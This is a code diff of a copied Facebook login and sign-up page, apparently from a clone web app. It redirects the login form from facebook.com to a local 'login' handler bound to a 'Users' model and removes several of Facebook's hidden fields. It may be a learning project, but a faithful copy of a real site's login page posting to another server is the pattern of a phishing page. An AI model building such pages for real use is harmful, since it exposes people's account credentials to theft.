@@ -166,9 +166,9 @@
 							</div>
 							<div class="menu_login_container rfloat _ohf"
 								data-testid="royal_login_form">
-								<form id="login_form"
-									action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110"
-									method="post" novalidate="1" onsubmit="">
+								<form id="login_form" ModelAttribute="Users"
+									action="login" method="post" novalidate="1"
+									onsubmit="">
 									<input type="hidden" name="jazoest" value="2765"
 										autocomplete="off" /><input type="hidden" name="lsd"
 										value="AVowWEuo" autocomplete="off" />
@@ -197,23 +197,6 @@
 												</div></td>
 										</tr>
 									</table>
-									<input type="hidden" autocomplete="off" name="timezone"
-										value="" id="u_0_9" /><input type="hidden" autocomplete="off"
-										name="lgndim" value="" id="u_0_a" /><input type="hidden"
-										name="lgnrnd" value="094703_0tA1" /><input type="hidden"
-										id="lgnjs" name="lgnjs" value="n" /><input type="hidden"
-										autocomplete="off" name="ab_test_data" value="" /><input
-										type="hidden" autocomplete="off" id="locale" name="locale"
-										value="en_GB" /><input type="hidden" autocomplete="off"
-										name="next" value="https://www.facebook.com/" /><input
-										type="hidden" autocomplete="off" name="login_source"
-										value="login_bluebar" /><input type="hidden"
-										autocomplete="off" name="guid" value="" /><input
-										type="hidden" autocomplete="off" id="prefill_contact_point"
-										name="prefill_contact_point" /><input type="hidden"
-										autocomplete="off" id="prefill_source" name="prefill_source" /><input
-										type="hidden" autocomplete="off" id="prefill_type"
-										name="prefill_type" />
 								</form>
 							</div>
 						</div>
@@ -327,7 +310,8 @@
 																aria-required="true"
 																placeholder="Mobile number or email address"
 																aria-label="Mobile number or email address" id="u_0_v"
-																required /><i class="_5dbc img sp_6E_d5dmi7E6 sx_f40ac8"></i><i
+																required /><i
+																class="_5dbc img sp_6E_d5dmi7E6 sx_f40ac8"></i><i
 																class="_5dbd img sp_6E_d5dmi7E6 sx_df456a"></i>
 															<div class="_1pc_"></div>
 														</div>
@@ -526,9 +510,10 @@
 														<span class="_5k_3" data-type="radio"
 															data-name="gender_wrapper" id="u_0_16"><span
 															class="_5k_2 _5dba"><input type="radio" name="sex"
-																value="female" id="u_0_6" /><label class="_58mt" for="u_0_6">Female</label></span><span
-															class="_5k_2 _5dba"><input type="radio" name="sex"
-																value="male" id="u_0_7" checked/><label class="_58mt" for="u_0_7">Male</label></span></span><i
+																value="female" id="u_0_6" /><label class="_58mt"
+																for="u_0_6">Female</label></span><span class="_5k_2 _5dba"><input
+																type="radio" name="sex" value="male" id="u_0_7" checked /><label
+																class="_58mt" for="u_0_7">Male</label></span></span><i
 															class="_5dbc _5k_6 img sp_6E_d5dmi7E6 sx_f40ac8"></i><i
 															class="_5dbd _5k_7 img sp_6E_d5dmi7E6 sx_df456a"></i>
 														<div class="_1pc_"></div>
@@ -550,9 +535,8 @@
 														<button type="submit" onclick="submitRegistrationForm();"
 															class="_6j mvm _6wk _6wl _58mi _3ma _6o _6v">Sign
 															Up</button>
-														<span id="signUP" style="color: red;"></span> 
-														<span id="signUPMessage" style="color: green;"></span> 
-														<span
+														<span id="signUP" style="color: red;"></span> <span
+															id="signUPMessage" style="color: green;"></span> <span
 															class="hidden_elem _58ml" id="u_0_19"><img
 															class="img"
 															src="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/GsNJNwuI-UM.gif"
@@ -585,8 +569,7 @@
 			<span><img src="https://facebook.com/security/hsts-pixel.gif"
 				width="0" height="0" style="display: none" /></span>
 		</div>
-		<
-		<span><img src="https://facebook.com/security/hsts-pixel.gif"
+		< <span><img src="https://facebook.com/security/hsts-pixel.gif"
 			width="0" height="0" style="display: none" /></span>
 	</div>
 	<div></div>
